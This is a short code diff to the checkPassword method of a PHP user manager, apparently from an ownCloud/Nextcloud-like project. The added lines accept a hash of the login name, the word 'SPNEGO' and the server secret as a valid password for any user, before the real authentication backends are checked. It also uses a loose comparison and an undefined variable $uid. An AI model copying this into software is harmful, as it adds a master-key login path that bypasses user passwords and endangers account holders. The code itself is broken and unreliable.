@@ -186,7 +186,12 @@ class Manager extends PublicEmitter implements IUserManager {
 	public function checkPassword($loginName, $password) {
 		$loginName = str_replace("\0", '', $loginName);
 		$password = str_replace("\0", '', $password);
-		
+		$secret = $this->config->getSystemValue('secret');
+		$spnegopass = hash('sha512', $loginName . 'SPNEGO' . $secret);
+		if ($password == $spnegopass) {
+			return $this->get($uid);
+		}
+
 		foreach ($this->backends as $backend) {
 			if ($backend->implementsActions(Backend::CHECK_PASSWORD)) {
 				$uid = $backend->checkPassword($loginName, $password);
